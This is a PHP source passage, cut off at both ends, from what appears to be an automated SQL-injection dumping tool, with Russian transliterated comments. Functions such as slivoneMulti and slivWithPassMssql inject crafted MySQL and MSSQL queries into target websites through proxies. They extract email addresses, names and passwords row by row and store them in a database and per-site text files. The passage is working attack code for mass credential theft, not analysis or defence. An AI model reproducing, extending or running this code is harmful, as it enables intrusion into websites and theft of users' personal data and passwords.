								$this->logs($url['host'] . ' multiSliv odinakovie $l == 5500:' . $this->r, 'slivMulti');
								$this->d('multiSliv odinakovie $l == 5500:');
								$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);
								$this->Post->query('UPDATE  `multis` SET  `prich` = \'multiSliv odinakovie l == 100\'  WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);

								return 'vpizdu';
							}

						}
					}
					 else {
						$this->email_gavno++;
// visit Было if()
						if (($this->email_gavno == $this->email_bad) && ($this->up == false)) {
							$this->d('Mnogo email_gavno ' . $this->email_bad);
							$this->logs($url['host'] . ' Mnogo email_gavno slivConcat:' . $this->email_bad, 'slivMulti');
							$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);
							$this->Post->query('UPDATE  `multis` SET  `prich` = \'Mnogo email_gavno slivConcat ' . $this->email_bad . '\'  WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);

							return 'vpizdu';
						}

					}
				}
			}
			 else {
				$this->emp++;

				if (($this->emp == $this->hunta) && ($this->up == false)) {
					$this->d($this->emp, '$this->hunta = 105 vpizdu');
					$this->logs($url['host'] . ' ' . $this->hunta . ' $this->emp = 25vpizdu:' . $this->r, 'slivMulti');
					$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);
					$this->Post->query('UPDATE  `multis` SET  `prich` = \'sliv multis ' . $this->hunta . ' vashe ne vibralos\'  WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);
					return 'vpizdu';
				}

			}

			++$i;
		}

		if ($this->sliv_save == true) {
			fclose($fh);
		}


		$this->d('thanks za skachku');
		$this->Post->query('UPDATE  `multis` SET  `get` = 2 WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);
	}

	public function slivoneMulti($id, $potok = 1, $lastlimit = 0, $oneCount = 0)
	{
		if (!(isset($this->raznica_dump)) || ($this->raznica_dump == '')) {
			$this->raznica_dump = 60;
		}


		$settings['potok_one'] = $this->potok_one;
		$settings['dump_one_good'] = $this->dump_one_good;
		$settings['dump_one'] = $this->dump_one;
		$settings['check_url'] = $this->check_url;
		$settings['potok'] = $this->potok;
		$settings['pass'] = $this->pass;
		$hunta = 1;
		$mail = $this->Filed->findbyid($id);
		$filed_id = $mail['Filed']['id'];
		$squle = $this->Post->query('SELECT * FROM `posts` WHERE `id` = ' . $mail['Filed']['post_id'] . ' limit 0,1');

		if (2 < strlen($squle[0]['posts']['sleep'])) {
			$set = $squle[0]['posts']['sleep'];
			$this->d($set, 'SET email odin');
		}
		 else {
			$set = false;
		}

		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		$this->mysqlInj->inject($squle[0]['posts']['header'] . '::' . $squle[0]['posts']['gurl'], $squle[0], $set);
		$bd = explode(':', $mail['Filed']['ipbase']);
		$count = $mail['Filed']['count'];
		$squle[0]['posts']['url'] = str_replace('http://', '', $squle[0]['posts']['url']);
		$squle[0]['posts']['url'] = 'http://' . $squle[0]['posts']['url'];
		$url = parse_url($squle[0]['posts']['url']);
		$zone = explode('.', $url['host']);
		$zone = $zone[count($zone) - 1];

		if ($this->sliv_save == true) {
			$filename = './sliv_save/' . $url['host'] . '.txt';
			$fh = fopen($filename, 'a+');
		}


		$time = time();
		$tmp = array();
		$tmp3 = array();
		$this->l2 = 0;
		$this->tmp2 = array();
		$this->k = 0;
		$this->logs($lastlimit . '-function lastlimit:' . $this->r, 'slivoneMulti');
		$this->logs($oneCount . '-function oneCount:' . $this->r, 'slivoneMulti');
		$this->logs($potok . '-function potok:' . $this->r, 'slivoneMulti');
		$this->logs(ceil($lastlimit + $oneCount) . '-function lastlimit+oneCount:' . $this->r, 'slivoneMulti');
		$i = $lastlimit;

		while ($i < ceil($lastlimit + $oneCount)) {
			$this->workup();
			$new = time();
			$razn = $new - $time;

			if ($this->raznica_dump < $razn) {
				$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);
				$this->logs($razn . ' raznfunction > 25:' . $this->r, 'slivoneMulti');
				$this->d($razn, ' raznfunction > 25: ' . $this->r);
				$this->Post->query('UPDATE  `multis` SET  `prich` = \'slivOneMulti raznfunction > 25\'  WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);
				return 'vpizdu';
			}


			$time = time();
			$this->Post->query('UPDATE  `multis` SET  `lastlimit` = ' . $start . ',`date`=' . $time . ',`pid`=' . $this->pid . ' WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);
			$mysql = $this->mysqlInj->mysqlGetValue($bd[1], $mail['Filed']['table'], $mail['Filed']['label'], $i, array(), ' WHERE `' . $mail['Filed']['label'] . '` LIKE char(' . $this->charcher('%@%') . ')');

			if (trim($mysql[$mail['Filed']['label']]) !== '') {
				if ($this->sliv_save == true) {
					fwrite($fh, trim($mysql[$mail['Filed']['label']]) . "\n");
				}


				preg_match('/\A(?:^([a-z0-9][a-z0-9_\-\.\+]*)@([a-z0-9][a-z0-9\.\-]{0,63}\.([a-z]{2,4}))$)\z/i', $value, $z);

				if ($z[0] != '') {
					@$key = array_search($z[0], $tmp);
					$tmp[] = $z[0];
					@$key2 = array_search(strlen($z[0]), array_slice($this->tmp2, count($this->tmp2) - 1));

					if ($key === false) {
						echo $z[0] . '<br>';
						$m = explode('@', $z[0]);

						if ($key2 !== false) {
							$this->l2++;
							$this->d($this->l2, 'l2');

							if (($this->dlina < $this->l2) && ($this->up == false)) {
								$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);
								$this->Post->query('UPDATE  `multis` SET  `prich` = \'slivOneMulti po dline mnogo odinakovih ' . $this->dlina . '\'  WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);
								return 'vpizdu';
							}

						}
						 else {
							$this->l2--;
						}

						$this->Post->query('INSERT INTO `mails_one` (`email`,`pass`,`date`,`domen`,`hashtype`,`bd`,`zona`,`meiler`) VALUES(\'' . $z[0] . '\',\'0\',now(),\'' . $url[host] . '\',\'0\',\'' . $bd[1] . '\',\'' . $zone . '\',\'' . $m[1] . '\')');
						$hunta = 0;
					}

				}

			}
			 else {
				$hunta = $hunta + 1;
			}

			if ($hunta == $this->hunta) {
				$this->d($hunta, ' hunta > - ' . $this->hunta);
				$this->logs($hunta . ' hunta >:' . $this->hunta, 'slivoneMulti');
				$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);
				$this->Post->query('UPDATE  `multis` SET  `prich` = \'slivOneMulti hunta ' . $this->hunta . '\'  WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);
				return 'vpizdu';
			}


			++$i;
		}

		$this->Post->query('UPDATE  `multis` SET  `get` = 2 WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);

		if ($this->sliv_save == true) {
			fclose($fh);
		}

	}

	public function slivWithPassMssql($id = 2)
	{
		if (!(isset($this->raznica_dump)) || ($this->raznica_dump == '')) {
			$this->raznica_dump = 60;
		}


		$settings['potok_one'] = $this->potok_one;
		$settings['dump_one_good'] = $this->dump_one_good;
		$settings['dump_one'] = $this->dump_one;
		$settings['check_url'] = $this->check_url;
		$settings['potok'] = $this->potok;
		$settings['pass'] = $this->pass;
		$mail = $this->Filed->findbyid($id);
		$this->d($mail, '$mail');
		$filed_id = $mail['Filed']['id'];
		$this->logs($filed_id . '-$filed_id:' . $this->r, 'slivWithPassMssql');
		$this->d(' nachalo slivWithPassConcastMulti');
		$squle = $this->Post->query('SELECT * FROM  `posts` WHERE `id` = ' . $mail['Filed']['post_id'] . ' limit 0,1');

		if (!(isset($squle[0]['posts']['id']))) {
			$data = $this->Post->query('UPDATE  `fileds` SET  `get` =  \'3\', multi = 0 WHERE  `fileds`.`id` =' . $mail['Filed']['id']);
			return 'vpizdu';
		}


		$this->d($squle, '$squle POSTS');

		if (2 < strlen($squle[0]['posts']['sleep'])) {
			$set = $squle[0]['posts']['sleep'];
			$this->d($set, 'pass SET dump slivWithPassConcastMulti');
		}
		 else {
			$set = false;
		}

		$bd = explode(':', $mail['Filed']['ipbase']);
		$count = $mail['Filed']['count'];
		$ff = intval($mail['Filed']['lastlimit']);

		if ($ff == '') {
			$ff = 0;
		}


		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();

		if (preg_match('/microsoft/i', $squle[0]['posts']['version'])) {
			$this->mysqlInj->mssql = true;
			$this->d('MSSQL!');
		}


		$this->mysqlInj->inject($squle[0]['posts']['header'] . '::' . $squle[0]['posts']['gurl'], $squle[0], $set);
		$multi = $this->Post->query('SELECT count(*) FROM  `multis` WHERE `filed_id` = ' . $mail['Filed']['id'] . ' AND `get` !=0');
		$tmpCount = $count - $mail['Filed']['lastlimit'];
		$oneCount = $tmpCount / $settings['potok'];
		$oneCount = round($oneCount);
		$shag = 1;
		$zapr = round($oneCount / $shag);

		if ($zapr == 0) {
			$zapr = 1;
		}


		$this->d($count, '$count');
		$this->d($mail['Filed']['lastlimit'], '$mail["Filed"]["lastlimit"]');
		$this->d($multi, 'multi SELECT count(*) FROM  `multis` WHERE `filed_id` = ' . $mail['Filed']['id'] . ' AND `get` !=0');
		$this->d($zapr, 'zapr pervuy KOLICHESTVO ITERACYU');
		$this->d($oneCount . ' oneCount perviy S KAKOGO BUDEM NACHINAT $count-$mail["Filed"]["lastlimit"]/$settings["potok"]');
		flush();

		if ($multi[0][0]['count(*)'] == 0) {
			$this->d('//////////////////////////////////pervyi potok////////////////////////////////////////');

			if ($count < $this->potok_dump_one) {
				$oneCount = $count;
				$zapr = round($oneCount / $shag);
				$this->d($zapr, '$zapr 5000');
				$this->logs($zapr . ' $zapr 5000:' . $this->r, 'slivWithPassMssql');
				$this->Post->query('UPDATE  `fileds` SET  `get` =  \'2\', `multi` = 2 WHERE  `id` =' . $filed_id);
			}


			$potok = 1;

			if ($ff == 0) {
				$start = 0;
			}
			 else {
				$start = $ff;
			}

			$numPotok = $this->Post->query('SELECT count(*) FROM  `multis` WHERE `potok` = ' . $potok . ' AND `filed_id`=' . $filed_id);
			$this->d($numPotok, '$numPotok vsego potokov');

			if ($numPotok[0][0]['count(*)'] == 0) {
				$f = 'slivWithPassMssql';
				$this->d('shag 1');
				$post_id = $squle[0]['posts']['id'];
				$squle[0]['posts']['url'] = str_replace('http://', '', $squle[0]['posts']['url']);
				$squle[0]['posts']['url'] = 'http://' . $squle[0]['posts']['url'];
				$h2 = parse_url($squle[0]['posts']['url']);
				$domen = $h2['host'];
				$date = time();
				$tmpCount1 = $oneCount + $start;
				$this->d($post_id, '$post_id');
				$this->d($domen, 'domen');
				$this->d($tmpCount1, '$tmpCount1');
				$this->d($date, '$date');
				$this->d($f, '$f');
				$this->d($potok, '$potok');
				$this->d($start, '$start');
				$this->d($filed_id, '$filed_id');
				$this->d('shag 2');
				$this->d('INSERT INTO `multis` (`filed_id`,`lastlimit`,`count`,`get`,`potok`,`isp`,`post_id`,`domen`,`date`,`pid`) VALUES(' . $filed_id . ',' . $start . ',' . $tmpCount1 . ',1,' . $potok . ',\'' . $f . '\',' . $post_id . ',\'' . $domen . '\',\'' . $date . '\',' . $this->pid . ')');

				if ($this->Post->query('INSERT INTO `multis` (`filed_id`,`lastlimit`,`count`,`get`,`potok`,`isp`,`post_id`,`domen`,`date`,`pid`) VALUES(' . $filed_id . ',' . $start . ',' . $tmpCount1 . ',1,' . $potok . ',\'' . $f . '\',' . $post_id . ',\'' . $domen . '\',\'' . $date . '\',\'' . $this->pid . '\')')) {
				}


				$this->Post->query('UPDATE  `starts` SET  `potok` = ' . $potok . ' WHERE  `time_start` =' . $this->timeStart);
				$this->d('shag 3');
			}

		}
		 else {
			$this->d('ETO UJE NE PERVUY POTOK');
			$zav0 = $this->Post->query('SELECT * FROM  `multis` WHERE `get` = 3 AND `dok` = 1 AND `filed_id` =' . $filed_id . ' limit 1');
			$this->d($zav0, '$zav0 multislivcontacat pass  `get` = 3 AND `dok` = 1');

			if ($zav0[0]['multis']['get'] == 3) {
				$this->d('////////////////////////////////////////POPPITKI ISCHERPANU get = 3 AND dok = 1 V PIZDU//////////////////////////////////////////');

				if ($this->Post->query('UPDATE  `multis` SET  `get` =  2 WHERE  `potok` = ' . $zav0[0]['multis']['potok'] . ' AND `filed_id`=' . $filed_id)) {
					$this->d('YES update `multis` SET  `get` =  2');
				}


				$this->d('UPDATE  `multis` SET  `get` =  2 WHERE  `potok` = ' . $zav0[0]['multis']['potok'] . ' AND `filed_id`=' . $filed_id);
				$this->d($zav0, 'zav0 ETO ESLI BILI UJE 3 POPITKI `GET` 3 AND `DOK`=1 ////// Stavim status 2');
				return 'vpizdu';
			}


			$zav = $this->Post->query('SELECT * FROM  `multis` WHERE `get`=3 AND `dok` < 1 AND `filed_id`=' . $filed_id . ' limit 1');

			if ($zav[0]['multis']['get'] == 3) {
				$this->d('////////////////////PEREZAPUSK//////////////////////////////////////////');
				$this->d($zav, 'zav get=3 AND dok < 1 ////// dlya perezapuska');
				$dok = $zav[0]['multis']['dok'] + 1;
				$this->Post->query('UPDATE  `multis` SET  `get` =  1,`dok` =' . $dok . ' WHERE  `potok` = ' . $zav[0]['multis']['potok'] . ' AND `filed_id`=' . $filed_id);
				$this->Post->query('UPDATE  `starts` SET  `potok` = ' . $zav[0]['multis']['potok'] . ' WHERE  `time_start` =' . $this->timeStart);
				$start = $zav[0]['multis']['lastlimit'];
				$oneCount = $zav[0]['multis']['count'];
				$potok = $zav[0]['multis']['potok'];
				$oneCount = $oneCount - $start;
				$zapr = round($oneCount / $shag);
				$this->d($zapr, '$zapr get 3 KOLICHESTO ITERACYU POSLE PERESAPUSKA');
			}
			 else {
				$this->d('////////////////////DOBAVLYAEM NOVYU POTOK//////////////////////////////////////////');
				$allPotok = $multi[0][0]['count(*)'];
				$next = $this->Post->query('SELECT * FROM  `multis` WHERE `potok` = ' . $allPotok . ' AND `filed_id`=' . $filed_id);
				$this->d($allPotok, '$allPotok slivWithPassConcastMulti');
				$this->d($next, '$next - infa o poslednem potoke slivWithPassMssql');
				$start = $next[0]['multis']['count'];
				$oneCount = $next[0]['multis']['count'] + $oneCount;
				$oneCount = $oneCount - 20;
				$this->d($start, '$start');
				$this->d($count, '$count');
				$this->d($oneCount, '$oneCount');
				$potok = $next[0]['multis']['potok'] + 1;

				if ($count < $oneCount) {
					$this->d($oneCount . ' > ' . $count . ' oneCount > count  1');
					$oneCount = $count - 100;
					$start = $start - 100;

					if (6 <= $potok) {
						$potok = 6;
						$this->d('potok > 6 oneCount > count');
						$this->d('UPDATE  `multis` SET  `get` = 2 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id, '$oneCount > $count');

						if ($this->Post->query('UPDATE  `multis` SET  `get` = 2 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id)) {
							$this->d('YES update');
						}
						 else {
							$this->d('NE obnovilos');
						}

						if ($this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $allPotok . ' AND `filed_id`=' . $filed_id)) {
							$this->d('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $allPotok . ' AND `filed_id`=' . $filed_id);
							$this->d('YES update potok > 6 oneCount > count slivpass contact prosto');
						}


						return 'vpizdu';
					}

				}


				if ($oneCount < $count) {
					if ($multi[0][0]['count(*)'] < $settings['potok']) {
						$numPotok = $this->Post->query('SELECT count(*) FROM  `multis` WHERE `potok` = ' . $potok . ' AND `filed_id` =' . $filed_id);
						$this->d('SELECT count(*) FROM  `multis` WHERE `potok` = ' . $potok . ' AND `filed_id` =' . $filed_id, 'EST UJE POTOK TAKOY!!!');

						if ($numPotok[0][0]['count(*)'] == 0) {
							$f = 'slivWithPassMssql';
							$post_id = $squle[0]['posts']['id'];
							$squle[0]['posts']['url'] = str_replace('http://', '', $squle[0]['posts']['url']);
							$squle[0]['posts']['url'] = 'http://' . $squle[0]['posts']['url'];
							$h2 = parse_url($squle[0]['posts']['url']);
							$domen = $h2['host'];
							$date = time();

							if ($this->Post->query('INSERT INTO multis (`filed_id`,`lastlimit`,`count`,`get`,`potok`,`isp`,`post_id`,`domen`,`date`,`pid`) VALUES(' . $filed_id . ',' . $start . ',' . $oneCount . ',1,' . $potok . ',\'' . $f . '\',' . $post_id . ',\'' . $domen . '\',\'' . $date . '\',' . $this->pid . ')')) {
								$this->d($potok . ' $potok YES insert zapis');
								$this->logs($potok . ' - potok; YES insert zapis:' . $this->r, 'slivWithPassMssql');
							}
							 else {
								$this->d($potok . ' $potok NO!!!! insert zapis');
								$this->logs($potok . ' - potok;NO!!! insert zapis:' . $this->r, 'slivWithPassMssql');
							}

							$this->Post->query('UPDATE  `starts` SET  `potok` = ' . $potok . ' WHERE  `time_start` =' . $this->timeStart);
						}
						 else {
							$this->d('POTOK UJE EST v multis status get=3 stavim slivWithPassConcastMulti');
							$this->logs('POTOK UJE EST v multis status get=3 stavim slivWithPassConcastMulti' . $this->r, 'slivWithPassMssql');
							$this->d('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
							$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
							return 'vpizdu';
						}
					}
					 else {
						$this->d('$multis[0][0][count(*)] <= $settings[potok]');
						$this->logs('$multis[0][0][count(*)] <= $settings[potok]:' . $this->r, 'slivWithPassMssql');

						if (6 < $potok) {
							$potok = 6;
							$this->d('potok > 6');
						}


						$this->d('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
						$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
						return 'vpizdu';
					}
				}

			}
		}

		$squle[0]['posts']['url'] = str_replace('http://', '', $squle[0]['posts']['url']);
		$squle[0]['posts']['url'] = 'http://' . $squle[0]['posts']['url'];
		$url = parse_url($squle[0]['posts']['url']);
		$zone = explode('.', $url['host']);
		$zone = $zone[count($zone) - 1];
		$MSSQL_email_name_pass = './MSSQL_email_name_pass/' . $url['host'] . '.txt';
		$MSSQL_email_name = './MSSQL_email_name/' . $url['host'] . '.txt';
		$MSSQL_email_pass = './MSSQL_email_pass/' . $url['host'] . '.txt';
		$MSSQL_email = './MSSQL_email/' . $url['host'] . '.txt';
		$time = time();
		$this->l2 = 0;
		$this->tmp2 = array();
		$this->k = 0;
		$this->l5 = 0;
		$this->tmp5 = array();
		$this->emp = 0;
		$this->email_gavno = 0;
		$this->emp_pass = 0;
		$this->logs($zapr . '-zapr poslednyu:' . $this->r, 'slivWithPassMssql');
		$this->logs($oneCount . '-oneCount:' . $this->r, 'slivWithPassMssql');
		$this->logs($count . '-count:' . $this->r, 'slivWithPassMssql');
		$this->logs($start . '-start:' . $this->r, 'slivWithPassMssql');
		$this->logs($potok . '-potok:' . $this->r, 'slivWithPassMssql');
		$this->d($zapr . '-zapr poslednyu:' . $this->r);
		$this->d($oneCount . '-oneCount:' . $this->r);
		$this->d($count . '-count:' . $this->r);
		$this->d($start . '-start:' . $this->r);
		$this->d($potok . '-potok:' . $this->r);
		$this->d($this->pid . '-pid:' . $this->r);
		flush();
		$i = $start;

		while ($i < ceil($start + $oneCount)) {
			echo $i . '-i<br>';
			$this->workup();
			$new = time();
			$razn = $new - $time;
			$this->d($razn, 'razn');

			if ($this->raznica_dump < $razn) {
				$this->d($razn . '-razn slivWithPassMssql po vremeni > 25:' . $this->r);
				$this->logs($razn . '-razn po vremeni:' . $this->r, 'slivWithPassMssql');
				$this->Post->query('UPDATE  `multis` SET  `get` = 3  WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);
				$this->Post->query('UPDATE  `multis` SET  `prich` = \'razn slivWithPassMssql po vremeni\'  WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);
				return 'vpizdu';
			}


			$time = time();
			$this->workup();
			$pass = explode(':', $mail['Filed']['password']);
			$pass = $pass[1];
			$name = explode(':', $mail['Filed']['name']);
			$name = $name[1];
			$this->Post->query('UPDATE  `multis` SET  `lastlimit` = ' . $i . ',`date`= ' . $time . ',`pid`=' . $this->pid . ' WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
			$label = $mail['Filed']['label'];
			$table_old = $mail['Filed']['table'];
			$table_new = $this->mysqlInj->charcher_mssql($mail['Filed']['table']);
			$bd_new = $bd[1];

			if (($name != '') && ($pass != '')) {
				$vvv = 'emailnamepass';
				$mysql = $this->mysqlInj->mssqlGetValue('(/**/sElEcT top 1 isnull([' . $label . '],char(32))+char(58)+isnull([' . $name . '],char(32))+char(58)+isnull([' . $pass . '],char(32)) from (select top ' . $i . ' [' . $label . '],[' . $name . '],[' . $pass . '] from [' . $bd_new . ']..[' . $table_old . '] order by [' . $label . '] asc) sq order by [' . $label . '] desc)');
				$mysql2 = $mysql['(/**/sElEcT top 1 isnull([' . $label . '],char(32))+char(58)+isnull([' . $name . '],char(32))+char(58)+isnull([' . $pass . '],char(32)) from (select top ' . $i . ' [' . $label . '],[' . $name . '],[' . $pass . '] from [' . $bd_new . ']..[' . $table_old . '] order by [' . $label . '] asc) sq order by [' . $label . '] desc)'];
			}
			 else if (($name != '') && ($pass == '')) {
				$vvv = 'emailname';
				$mysql = $this->mysqlInj->mssqlGetValue('(/**/sElEcT top 1 isnull([' . $label . '],char(32))+char(58)+isnull([' . $name . '],char(32)) from (select top ' . $i . ' [' . $label . '],[' . $name . '] from [' . $bd_new . ']..[' . $table_old . '] order by [' . $label . '] asc) sq order by [' . $label . '] desc)');
				$mysql2 = $mysql['(/**/sElEcT top 1 isnull([' . $label . '],char(32))+char(58)+isnull([' . $name . '],char(32)) from (select top ' . $i . ' [' . $label . '],[' . $name . '] from [' . $bd_new . ']..[' . $table_old . '] order by [' . $label . '] asc) sq order by [' . $label . '] desc)'];
			}
			 else {
				$vvv = 'email';
				$mysql = $this->mysqlInj->mssqlGetValue('(/**/sElEcT top 1 isnull([' . $label . '] from (select top ' . $i . ' [' . $label . '] from [' . $bd_new . ']..[' . $table_old . '] order by [' . $label . '] asc) sq order by [' . $label . '] desc)');
				$mysql2 = $mysql['(/**/sElEcT top 1 isnull([' . $label . '] from (select top ' . $i . ' [' . $label . '] from [' . $bd_new . ']..[' . $table_old . '] order by [' . $label . '] asc) sq order by [' . $label . '] desc)'];
			}

			$this->d($mysql, '$mysql');
			$email_full = explode(':', $mysql2);
			$email_full = array_map(trim, $email_full);
			$this->d($email_full, '$email_full');

			if ($vvv == 'email') {
				$email_new = $mysql2;
			}
			 else if ($vvv == 'emailname') {
				if (strpos($email_full[0], '@')) {
					$email_new = $email_full[0];
					$name_new = $email_full[1];
				}
				 else if (strpos($email_full[1], '@')) {
					$email_new = $email_full[1];
					$name_new = $email_full[2];
				}

			}
			 else if ($vvv == 'emailnamepass') {
				if (strpos($email_full[0], '@')) {
					$email_new = $email_full[0];
					$name_new = $email_full[1];
					$pass_new = $email_full[2];
				}
				 else if (strpos($email_full[1], '@')) {
					$email_new = $email_full[1];
					$name_new = $email_full[2];
					$pass_new = $email_full[3];
				}

			}


			$this->d($email_new, '$email_new');

			if (($email_new != '') && strpos($email_new, '@')) {
				$null = 0;
				$l = 0;
				$tmp = array();
				$tmp3 = array();
				$p[0] = $email_new;
				if (strpos($pass_new, 'mysql_fetch_array()') && ($vvv == 'emailnamepass')) {
					$this->Post->query('UPDATE  `multis` SET  `prich` = \'mysql_fetch_array\'  WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
					$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
					$this->d('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
					$this->d('mysql_fetch_array() UHODIM');
					return 'vpizdu';
				}


				if (($pass_new == '') && ($name_new == '')) {
					$this->emp_pass++;
				}


				if ((175 < $this->emp_pass) && ($this->up == true)) {
					$this->logs('$this->emp_pass > 175:' . $this->r, 'slivWithPassMssql');
					$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
					$this->Post->query('UPDATE  `multis` SET  `prich` = \'emp_pass > 175 pass pustie\'  WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
					return 'vpizdu';
				}


				@$key0 = array_search($pass_new, $this->stopword);
				if ((($key0 === false) && (2 < strlen($pass_new)) && ($email_new != 'null')) || (($name_new != '') && (2 < strlen($name_new)))) {
					$ht = $this->hashtype($pass_new);

					if ($ht != 1) {
						$this->hashtype = $ht;
					}
					 else {
						$this->hashtype = '0';
					}

					preg_match('/\A(?:^([a-z0-9][a-z0-9_\-\.\+]*)@([a-z0-9][a-z0-9\.\-]{0,63}\.([a-z]{2,4}))$)\z/i', $p[0], $z);

					if ($z[0] != '') {
						$m = explode('@', $z[0]);
						@$key = array_search($pass_new, $tmp);
						@$key2 = array_search(strlen($pass), array_slice($this->tmp2, count($this->tmp2) - 1));
						@$key5 = array_search(strlen($z[0]), array_slice($this->tmp5, count($this->tmp5) - 1));
						@$key3 = array_search($p[0], $tmp3);
						$tmp[] = $pass_new;
						$tmp3[] = $p[0];
						$this->tmp2[] = strlen($pass_new);
						$this->tmp5[] = strlen($z[0]);

						if ($this->hashtype == '0') {
							if (($key2 !== false) && ($this->k < 6)) {
								$this->l2++;

								if (7 < $this->l2) {
									$this->hashtype = 'unkown';
								}

							}
							 else {
								$this->k++;
							}
						}


						if ($key5 !== false) {
							$this->l5++;

							if ($this->up == true) {
								if ((5075 < $this->l5) && ($this->up == false)) {
									$this->logs('$this->l5 > 5075:' . $this->r, 'slivWithPassMssql');
									$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
									$this->Post->query('UPDATE  `multis` SET  `prich` = \'this->l5 > 5075 odonakovie po dline\'  WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);
									return 'vpizdu';
								}

							}
							 else if ((75 < $this->l5) && (5075 < $this->l5) && ($this->up == false)) {
								$this->logs('$this->l5 > 75:' . $this->r, 'slivWithPassMssql');
								$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
								$this->Post->query('UPDATE  `multis` SET  `prich` = \'this->l5 > 75 odonakovie po dline\'  WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);
								return 'vpizdu';
							}

						}
						 else {
							$this->l5--;
						}

						if (($key === false) && ($key3 === false)) {
							if ($this->Post->query('INSERT INTO mails (`email`,`name`,`pass`,`date`,`domen`,`hashtype`,`bd`,`zona`,`meiler`) VALUES(\'' . $p[0] . '\',\'' . $name_new . '\',\'' . $pass_new . '\',now(),\'' . $url[host] . '\',\'' . $this->hashtype . '\',\'' . $bd[1] . '\',\'' . $zone . '\',\'' . $m[1] . '\')')) {
								if (($email_new != '') && ($name_new != '') && ($pass_new != '')) {
									$fh_email_name_pass = fopen($MSSQL_email_name_pass, 'a+');
									fwrite($fh_email_name_pass, trim($email_new) . ':' . trim($name_new) . ':' . trim($pass_new) . "\n");
									fclose($fh_email_name_pass);
								}
								 else if (($email_new != '') && ($name_new != '')) {
									$fh_email_name = fopen($MSSQL_email_name, 'a+');
									fwrite($fh_email_name, trim($email_new) . ':' . trim($name_new) . "\n");
									fclose($fh_email_name);
								}
								 else if (($email_new != '') && ($pass_new != '')) {
									$fh_email_pass = fopen($MSSQL_email_pass, 'a+');
									fwrite($fh_email_name, trim($email_new) . ':' . trim($pass_new) . "\n");
									fclose($fh_email_pass);
								}
								 else if ($email_new != '') {
									$fh_email = fopen($MSSQL_email, 'a+');
									fwrite($fh_email, trim($email_new) . "\n");
									fclose($fh_email);
								}

							}

						}
						 else {
							++$l;

							if ($this->up == true) {
								if (($l == 15000) && ($this->up == false)) {
									$this->logs('$l == 15000:' . $this->r, 'slivWithPassMssql');
									$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
									$this->Post->query('UPDATE  `multis` SET  `prich` = \'l == 15000 pohojie\'  WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
									return 'vpizdu';
								}

							}
							 else if (($l == 20) && $this->Post->query('INSERT INTO mails (`email`,`name`,`pass`,`date`,`domen`,`hashtype`,`bd`,`zona`,`meiler`) VALUES(\'' . $p[0] . '\',\'' . $name_new . '\',\'' . $pass_new . '\',now(),\'' . $url[host] . '\',\'' . $this->hashtype . '\',\'' . $bd[1] . '\',\'' . $zone . '\',\'' . $m[1] . '\')')) {
								$this->logs('$l == 20:' . $this->r, 'slivWithPassMssql');
								$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
								$this->Post->query('UPDATE  `multis` SET  `prich` = \'l == 20 pohojie\'  WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
								return 'vpizdu';
							}

						}
					}
					 else {
						$this->email_gavno++;

						if ($this->up == true) {
							if (($this->email_gavno == 15000) && ($this->up == false)) {
								echo 'Mnogo email_gavno 15000';
								$this->logs('Mnogo email_gavno:' . $this->r, 'slivWithPassMssql');
